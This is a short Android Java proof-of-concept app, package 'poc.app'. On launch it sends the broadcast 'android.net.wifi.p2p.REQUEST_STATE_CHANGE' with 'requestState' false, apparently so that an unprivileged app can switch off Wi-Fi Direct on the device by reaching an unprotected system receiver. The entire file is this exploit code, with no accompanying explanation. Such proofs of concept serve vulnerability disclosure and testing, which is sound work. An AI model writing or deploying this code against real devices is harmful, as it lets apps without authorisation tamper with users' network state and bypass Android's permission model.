package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent i = new Intent("android.net.wifi.p2p.REQUEST_STATE_CHANGE");
        i.putExtra("requestState", false);
        sendBroadcast(i);
    }
}